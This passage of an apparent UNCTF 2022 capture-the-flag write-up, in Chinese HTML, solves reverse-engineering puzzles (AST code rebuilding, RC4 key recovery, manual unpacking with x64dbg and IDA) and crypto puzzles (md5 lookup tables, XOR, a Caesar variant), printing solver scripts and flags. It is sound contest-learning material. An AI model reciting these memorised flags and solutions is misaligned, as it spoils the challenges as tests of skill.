class="built_in">chr</span>(<span class="number">32</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># UNCTF&#123;OAOJYKOFR&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="ezast-浙江师范大学"><a href="#ezast-浙江师范大学" class="headerlink" title="ezast-浙江师范大学"></a>ezast-浙江师范大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点`：`ast树`，`js`，`代码还原</span><br></pre></td></tr></table></figure><ul><li><p>一口老血吐出来</p></li><li><p>第一次遇到这种题，研究了一下ast树，然后就开始手推源代码</p></li><li><p>一边构建代码看ast一边还原（得亏有个ast在线网站）</p></li><li><p>还原代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ezdecode</span>(<span class="params">flag,key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> arr_data = flag.<span class="title function_">split</span>()</span><br><span class="line">  <span class="keyword">return</span> arr_data.<span class="title function_">map</span>(<span class="function"><span class="params">i</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i.<span class="title function_">charCodeAt</span>()^(key += <span class="number">1</span>))).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> $_a = <span class="title function_">test</span>()</span><br><span class="line">$_a -= <span class="number">1145</span>*<span class="number">100</span></span><br><span class="line">$_a += <span class="number">0xb</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">ezdecode</span>(<span class="string">&quot;OTYN\\a[inE+iEl.hcEo)ivo+g&quot;</span>,$_a))</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">114514</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>emmmm，每次只能解密一个字符，然后我就直接手删了半天加密串把flag构造出来了</p></li><li><p>对了，还有一个用来转义的\要删掉</p></li><li><p>UNCTF{Ast_1s_v4ry_u3slu1}</p></li></ul><h3 id="HelloRust"><a href="#HelloRust" class="headerlink" title="HelloRust"></a>HelloRust</h3><ul><li><p>这题，一切都在动调中</p></li><li><p>首先通过关键词检索识别为rc4加密</p></li><li><p>修改内存数据，将unctf等等一系列数据变为字符串</p></li><li><p>动调，在keyinit函数处找到密钥<code>Unctf2022</code></p></li><li><p>在cmp函数上方找到密文</p></li><li><p>提取密文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> addr = <span class="number">0x00005622B1A340A6</span>;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">Message</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i; i &lt; (<span class="number">0x00005622B1A340C1</span> - addr + <span class="number">1</span>); i = i+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Message</span>(<span class="string">&quot;%02x&quot;</span>,<span class="built_in">Byte</span>(addr+i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//876927216fc731261b6c3a749a626ea002811d85e0e2d071f4a3090e</span></span><br></pre></td></tr></table></figure></li><li><p>在线网站解密得到</p></li><li><p>unctf{Ru5t_Rc4_1s_2_e@zy!!!}</p></li></ul><h3 id="shelled-babyxor-重庆大学"><a href="#shelled-babyxor-重庆大学" class="headerlink" title="shelled_babyxor-重庆大学"></a>shelled_babyxor-重庆大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点`：`手动脱壳`，`数据处理`，`逆写解密</span><br></pre></td></tr></table></figure><ul><li><p>提示脱壳+算法逆向，有点东西</p></li><li><p>脱壳只能手动，没发现常规的pushad之类的东西，但知道是运行自解密</p></li><li><p>x64dbg运行到解密位置，把程序dump出来拖进ida64</p></li><li><p>ctrl+f12搜索unctf，发现有，定位过去，x交叉引用，定位关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">FOOL:0000000000402E30 53                            push    rbx</span><br><span class="line">FOOL:0000000000402E31 48 83 EC 50                   sub     rsp, 50h</span><br><span class="line">FOOL:0000000000402E35 E8 06 EA FF FF                call    sub_401840</span><br><span class="line">FOOL:0000000000402E35</span><br><span class="line">FOOL:0000000000402E3A 48 8B 0D 1F 15 00 00          mov     rcx, cs:off_404360</span><br><span class="line">FOOL:0000000000402E41 48 8D 5C 24 20                lea     rbx, [rsp+58h+var_38]</span><br><span class="line">FOOL:0000000000402E46 48 8D 15 B3 11 00 00          lea     rdx, aInputYourAnswe            ; &quot;input your answer\n&quot;</span><br><span class="line">FOOL:0000000000402E4D E8 26 E9 FF FF                call    sub_401778</span><br><span class="line">FOOL:0000000000402E4D</span><br><span class="line">FOOL:0000000000402E52 48 8B 0D F7 14 00 00          mov     rcx, cs:off_404350</span><br><span class="line">FOOL:0000000000402E59 48 89 DA                      mov     rdx, rbx</span><br><span class="line">FOOL:0000000000402E5C E8 0F E9 FF FF                call    sub_401770</span><br><span class="line">FOOL:0000000000402E5C</span><br><span class="line">FOOL:0000000000402E61 48 89 D9                      mov     rcx, rbx</span><br><span class="line">FOOL:0000000000402E64 E8 07 E7 FF FF                call    sub_401570</span><br><span class="line">;核心函数</span><br><span class="line">FOOL:0000000000402E64</span><br><span class="line">FOOL:0000000000402E69 85 C0                         test    eax, eax</span><br><span class="line">FOOL:0000000000402E6B 75 1B                         jnz     short loc_402E88</span><br><span class="line">FOOL:0000000000402E6B</span><br><span class="line">FOOL:0000000000402E6D 48 8B 0D EC 14 00 00          mov     rcx, cs:off_404360</span><br><span class="line">FOOL:0000000000402E74 48 8D 15 B4 11 00 00          lea     rdx, aSorryYouAreWro            ; &quot;sorry you are wrong&quot;</span><br><span class="line">FOOL:0000000000402E7B E8 F8 E8 FF FF                call    sub_401778</span><br><span class="line">FOOL:0000000000402E7B</span><br><span class="line">FOOL:0000000000402E80</span><br><span class="line">FOOL:0000000000402E80                               loc_402E80:                             ; CODE XREF: sub_402E30+6B↓j</span><br><span class="line">FOOL:0000000000402E80 31 C0                         xor     eax, eax</span><br><span class="line">FOOL:0000000000402E82 48 83 C4 50                   add     rsp, 50h</span><br><span class="line">FOOL:0000000000402E86 5B                            pop     rbx</span><br><span class="line">FOOL:0000000000402E87 C3                            retn</span><br><span class="line">FOOL:0000000000402E87</span><br><span class="line">FOOL:0000000000402E88                               ; ---------------------------------------------------------------------------</span><br><span class="line">FOOL:0000000000402E88</span><br><span class="line">FOOL:0000000000402E88                               loc_402E88:                             ; CODE XREF: sub_402E30+3B↑j</span><br><span class="line">FOOL:0000000000402E88 48 8B 0D D1 14 00 00          mov     rcx, cs:off_404360</span><br><span class="line">FOOL:0000000000402E8F 48 8D 15 7D 11 00 00          lea     rdx, aYouAreRightWel            ; &quot;you are right!welcome to re&quot;</span><br><span class="line">FOOL:0000000000402E96 E8 DD E8 FF FF                call    sub_401778</span><br></pre></td></tr></table></figure></li><li><p>跟进函数发现只有sub_401570在大面积操作数据，F5跟进</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v2;</span><br><span class="line">    v1 += v3 % <span class="number">22</span>;<span class="comment">//取余得到一个v1</span></span><br><span class="line">    <span class="keyword">if</span> ( v2 == &amp;v7[<span class="number">5</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = *v2;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">115</span>; ; i = *&amp;v7[<span class="number">4</span> * v4 + <span class="number">5</span>] )<span class="comment">//取数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v1 ^ *(a1 + v4)) != i )<span class="comment">//校对</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v4 == <span class="number">41</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>终于找到真正的核心了，直接逆写解密，先求v1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1 = <span class="number">0</span>; </span><br><span class="line">  <span class="type">char</span> v7[] = <span class="string">&quot;unctfs&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    v1 += (((<span class="type">int</span>)v7[i]) % <span class="number">22</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt;v1 &lt;&lt;endl;<span class="comment">//38</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后拿38跟这函数给出的一堆数据异或了一下，能搞出UNCTF，那就是答案没跑了，整理数据（痛苦面具），直接写解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    num.append(<span class="number">4</span>*i+<span class="number">5</span>)</span><br><span class="line">v9 = [<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x60</span>,<span class="number">0x5D</span>,<span class="number">0x5F</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x4C</span>,<span class="number">0x53</span>,<span class="number">0x55</span>,<span class="number">0x52</span>, <span class="number">0x79</span>,<span class="number">0x53</span>, <span class="number">0x48</span>,<span class="number">0x56</span>,<span class="number">0x47</span>,<span class="number">0x45</span>, <span class="number">0x4D</span>,<span class="number">0x43</span>, <span class="number">0x42</span>,<span class="number">0x79</span>, <span class="number">0x5F</span>,<span class="number">0x49</span>, <span class="number">0x53</span>,<span class="number">0x54</span>, <span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x4F</span>,<span class="number">0x54</span>,<span class="number">0x55</span>,<span class="number">0x52</span>,<span class="number">0x79</span>,<span class="number">0x56</span>, <span class="number">0x54</span>,<span class="number">0x49</span>, <span class="number">0x41</span>,<span class="number">0x54</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(v9))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v9:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">38</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">71</span>^<span class="number">38</span>))</span><br><span class="line"><span class="comment"># CTF&#123;you_just_unpacked_your_first_progra</span></span><br></pre></td></tr></table></figure></li><li><p>然后，UN我之前验证了，没写，最后program}猜得出来，寄</p></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><code>Crypto</code></h2><h3 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`md5</span><br></pre></td></tr></table></figure><ul><li>像我这种大冤种直接造md5加密字典</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">    <span class="comment"># 待加密信息</span></span><br><span class="line">    str2 = <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">list</span>[str2] = hl.hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    str1 = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str1.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">list</span>[str1] = hl.hexdigest()</span><br><span class="line">l = <span class="built_in">dict</span>(<span class="built_in">zip</span>(<span class="built_in">list</span>.values(),<span class="built_in">list</span>.keys()))</span><br><span class="line">li = [<span class="string">&#x27;4c614360da93c0a041b22e537de151eb&#x27;</span>,<span class="string">&#x27;8d9c307cb7f3c4a32822a51922d1ceaa&#x27;</span>,<span class="string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>,<span class="string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,<span class="string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>,<span class="string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,<span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,<span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<span class="string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>,<span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,<span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>,<span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,<span class="string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>,<span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,<span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<span class="string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>,<span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<span class="string">&#x27;4a8a08f09d37b73795649038408b5f33&#x27;</span>,<span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,<span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,<span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,<span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,<span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,<span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>,<span class="string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>,<span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<span class="string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,<span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span>,<span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,<span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<span class="string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    <span class="keyword">if</span> l.get(i):</span><br><span class="line">        <span class="built_in">print</span>(l[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`md5`，`异或</span><br></pre></td></tr></table></figure><ul><li>多了个异或罢了，注意长度不够补位就行^_^</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成表</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">list</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">123</span>):</span><br><span class="line">    <span class="comment"># 待加密信息</span></span><br><span class="line">    str2 = <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">list</span>[str2] = hl.hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    str1 = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str1.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">list</span>[str1] = hl.hexdigest()</span><br><span class="line">x = [<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&quot;^&quot;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    str2 = i</span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">list</span>[str2] = hl.hexdigest()</span><br><span class="line">l = <span class="built_in">dict</span>(<span class="built_in">zip</span>(<span class="built_in">list</span>.values(),<span class="built_in">list</span>.keys()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检验</span></span><br><span class="line">li = [<span class="number">0x4c614360da93c0a041b22e537de151eb</span>,<span class="number">0xc1fd731c6d60040369908b4a5f309f41</span>,<span class="number">0x80fdc84bbb5ed9e207a21d5436efdcfd</span>,<span class="number">0xb48d19bb99a7e6bb448f63b75bc92384</span>,<span class="number">0x39eaf918a52fcaa5ed9195e546b021c1</span>,<span class="number">0x795d6869f32db43ff5b414de3c235514</span>,<span class="number">0xf59a054403f933c842e9c3235c136367</span>,<span class="number">0xc80b37816048952a3c0fc9780602a2fa</span>,<span class="number">0x810ecef68e945c3fe7d6accba8b329bd</span>,<span class="number">0xcad06891e0c769c7b02c228c8c2c8865</span>,<span class="number">0x470a96d253a639193530a15487fea36f</span>,<span class="number">0x470a96d253a639193530a15487fea36f</span>,<span class="number">0x4bdea6676e5335f857fa8e47249fa1d8</span>,<span class="number">0x810ecef68e945c3fe7d6accba8b329bd</span>,<span class="number">0xedbb7ab78cde98a07b9b5a2ab284bf0a</span>,<span class="number">0x44b43e07e9af05e3b9b129a287e5a8df</span>,<span class="number">0xa641c08ed66b55c9bd541fe1b22ce5c0</span>,<span class="number">0xabed1f675819a2c0f65c9b7da8cab301</span>,<span class="number">0x738c486923803a1b59ef17329d70bbbd</span>,<span class="number">0x7e209780adf2cd1212e793ae8796ed7c</span>,<span class="number">0xa641c08ed66b55c9bd541fe1b22ce5c0</span>,<span class="number">0xa641c08ed66b55c9bd541fe1b22ce5c0</span>,<span class="number">0x636a84a33e1373324d64463eeb8e7614</span>,<span class="number">0x6ec65b4ab061843b066cc2a2f16820d5</span>,<span class="number">0xa4a39b59eb036a4a8922f7142f874114</span>,<span class="number">0x8c34745bd5b5d42cb3efe381eeb88e4b</span>,<span class="number">0x5b1ba76b1d36847d632203a75c4f74e2</span>,<span class="number">0xd861570e7b9998dbafb38c4f35ba08bc</span>,<span class="number">0x464b7d495dc6019fa4a709da29fc7952</span>,<span class="number">0x8eb69528cd84b73d858be0947f97b7cc</span>,<span class="number">0xdd6ac4c783a9059d11cb0910fc95d4a</span>,<span class="number">0x4b6b0ee5d5f6b24e6898997d765c487c</span>,<span class="number">0xb0762bc356c466d6b2b8f6396f2e041</span>,<span class="number">0x8547287408e2d2d8f3834fc1b90c3be9</span>,<span class="number">0x82947a7d007b9854fa62efb18c9fd91f</span>,<span class="number">0x8ddafe43b36150de851c83d80bd22b0a</span>,<span class="number">0xc7b36c5f23587e285e528527d1263c8b</span>,<span class="number">0x2a0816e8af86e68825c9df0d63a28381</span>,<span class="number">0x63ce72a42cf62e6d0fdc6c96df4687e3</span>]</span><br><span class="line"><span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(li)):</span><br><span class="line">    li[cnt] ^= li[cnt - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(li)):</span><br><span class="line">    li[cnt] = <span class="built_in">hex</span>(li[cnt])</span><br><span class="line">    li[cnt] = li[cnt][<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(i) != <span class="number">32</span>):</span><br><span class="line">        i1 = <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i1 = i</span><br><span class="line">    <span class="keyword">if</span> l.get(i1):</span><br><span class="line">        <span class="built_in">print</span>(l[i1],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;false&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">摩斯密码</span><br></pre></td></tr></table></figure><ul><li>摩斯密码01解密，这不写了吧</li></ul><h3 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h3><ul><li><p>题目提示了base64表</p></li><li><p>UNCTF校验发现是+45替换，逆写即可</p></li><li><p>脚本(坑点是得去掉末尾空格)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s=  <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">w = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> w:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span>(s.index(i) &gt;= <span class="number">45</span>):</span><br><span class="line">            <span class="built_in">print</span>(s[s.index(i) - <span class="number">45</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(s[s.index(i)+<span class="number">45</span>-<span class="number">64</span>-<span class="number">26</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="ezxor-浙江师范大学"><a href="#ezxor-浙江师范大学" class="headerlink" title="ezxor-浙江师范大学"></a>ezxor-浙江师范大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 